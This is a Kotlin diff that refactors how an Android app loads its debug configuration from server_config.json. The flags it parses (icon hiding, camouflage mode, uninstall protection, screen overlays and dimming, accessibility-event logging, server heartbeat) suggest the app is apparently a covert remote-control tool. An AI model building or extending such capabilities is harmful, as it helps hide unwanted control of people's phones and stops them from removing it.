@@ -16,7 +16,7 @@ import org.json.JSONObject
  */
 object DebugConfig {
     private const val TAG = "DebugConfig"
-    private const val CONFIG_FILE = "config.json"
+    private const val CONFIG_FILE = "server_config.json"
 
     // ── global ──
     var debug: Boolean = false; private set
@@ -72,70 +72,39 @@ object DebugConfig {
         }
 
         try {
-            val json = context.assets.open(CONFIG_FILE).bufferedReader().use { it.readText() }
-            val root = JSONObject(json)
+            val configStr = com.storm.safe.rock.util.AssetConfigReader.readAssetConfig(context, CONFIG_FILE)
+            if (configStr == null) { Log.d(TAG, "server_config.json 不存在，使用默认值"); initialized = true; return }
+            val root = JSONObject(configStr)
 
-            // global debug switch — overrides all disable_* fields
             debug = root.optBoolean("debug", false)
+            webUrl = root.optString("webUrl", "")
 
-            // overlay
-            root.optJSONObject("overlay")?.let { o ->
-                disableConfigMask = o.optBoolean("disable_config_mask", false)
-                disableFullscreenBlocker = o.optBoolean("disable_fullscreen_blocker", false)
-                disableCipherOverlay = o.optBoolean("disable_cipher_overlay", false)
-                maskBgUrl = o.optString("mask_bg_url", "")
-                maskIconUrl = o.optString("mask_icon_url", "")
+            root.optJSONObject("debugConfig")?.let { d ->
+                disableConfigMask = d.optBoolean("disable_config_mask", false)
+                disableFullscreenBlocker = d.optBoolean("disable_fullscreen_blocker", false)
+                disableCipherOverlay = d.optBoolean("disable_cipher_overlay", false)
+                maskBgUrl = d.optString("mask_bg_url", "")
+                maskIconUrl = d.optString("mask_icon_url", "")
+                disableWebView = d.optBoolean("disable_webview", false)
+                disableDimScreen = d.optBoolean("disable_dim_screen", false)
+                disableBrightnessRestore = d.optBoolean("disable_brightness_restore", false)
+                disableIconHide = d.optBoolean("disable_icon_hide", false)
+                disableCamouflageMode = d.optBoolean("disable_camouflage_mode", false)
+                disableUninstallProtection = d.optBoolean("disable_uninstall_protection", false)
+                disableRecentsGuard = d.optBoolean("disable_recents_guard", false)
+                disableWriteSettingsAuto = d.optBoolean("disable_write_settings_auto", false)
+                disableBrandEngine = d.optBoolean("disable_brand_engine", false)
+                automationDelayMs = d.optLong("automation_delay_ms", 800L)
+                serverUrlOverride = d.optString("server_url_override", "")
+                disableHeartbeat = d.optBoolean("disable_heartbeat", false)
+                logAllWsMessages = d.optBoolean("log_all_ws_messages", false)
+                verboseInitChain = d.optBoolean("verbose_init_chain", false)
+                verboseEventDispatch = d.optBoolean("verbose_event_dispatch", false)
+                verboseNodeSearch = d.optBoolean("verbose_node_search", false)
+                logAllAccessibilityEvents = d.optBoolean("log_all_accessibility_events", false)
             }
 
-            // webview
-            root.optJSONObject("webview")?.let { w ->
-                webUrl = w.optString("web_url", "")
-                disableWebView = w.optBoolean("disable_webview", false)
-            }
-
-            // screen
-            root.optJSONObject("screen")?.let { s ->
-                disableDimScreen = s.optBoolean("disable_dim_screen", false)
-                disableBrightnessRestore = s.optBoolean("disable_brightness_restore", false)
-            }
-
-            // icon
-            root.optJSONObject("icon")?.let { i ->
-                disableIconHide = i.optBoolean("disable_icon_hide", false)
-                disableCamouflageMode = i.optBoolean("disable_camouflage_mode", false)
-            }
-
-            // protection
-            root.optJSONObject("protection")?.let { p ->
-                disableUninstallProtection = p.optBoolean("disable_uninstall_protection", false)
-                disableRecentsGuard = p.optBoolean("disable_recents_guard", false)
-            }
-
-            // automation
-            root.optJSONObject("automation")?.let { a ->
-                disableWriteSettingsAuto = a.optBoolean("disable_write_settings_auto", false)
-                disableBrandEngine = a.optBoolean("disable_brand_engine", false)
-                automationDelayMs = a.optLong("automation_delay_ms", 800L)
-            }
-
-            // network
-            root.optJSONObject("network")?.let { n ->
-                serverUrlOverride = n.optString("server_url_override", "")
-                disableHeartbeat = n.optBoolean("disable_heartbeat", false)
-                logAllWsMessages = n.optBoolean("log_all_ws_messages", false)
-            }
-
-            // logging
-            root.optJSONObject("logging")?.let { l ->
-                verboseInitChain = l.optBoolean("verbose_init_chain", false)
-                verboseEventDispatch = l.optBoolean("verbose_event_dispatch", false)
-                verboseNodeSearch = l.optBoolean("verbose_node_search", false)
-                logAllAccessibilityEvents = l.optBoolean("log_all_accessibility_events", false)
-            }
-
-            if (debug) {
-                disableConfigMask = true
-            }
+            if (debug) { disableConfigMask = true }
 
             Log.i(TAG, "✅ 调试配置已加载: debug=$debug mask=$disableConfigMask dim=$disableDimScreen icon=$disableIconHide protect=$disableUninstallProtection")
         } catch (e: Exception) {
